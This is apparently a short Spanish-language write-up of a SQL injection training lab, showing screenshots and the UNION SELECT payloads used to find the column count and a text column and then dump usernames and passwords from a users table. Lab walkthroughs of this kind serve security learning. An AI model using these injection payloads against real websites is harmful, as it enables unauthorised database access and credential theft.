Tenemos el siguiente laboratorio:
![[Pasted image 20240517154643.png]]
Cuando entramos en alguna de las categorías, vemos que se cambia la url:
![[Pasted image 20240517154709.png]]
A continuación, determinamos el número de columnas, las cuales son dos:
```bash
'+UNION+SELECT+NULL,'abc'--
```
![[Pasted image 20240517154832.png]]
Donde vemos que sólo una de ellas contiene texto:
```bash
Accessories'+UNION+SELECT+'texto','texto'--
```
![[Pasted image 20240517154931.png]]
```bash
Accessories'+UNION+SELECT+NULL,'texto'--
```
![[Pasted image 20240517155102.png]]
Ahora podemos usar el siguiente payload para volcar el contenido de la tabla users:
```bash
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```
![[Pasted image 20240517155212.png]]
Y con estas credenciales ya habremos resuelto el laboratorio:
![[Pasted image 20240517155249.png]]
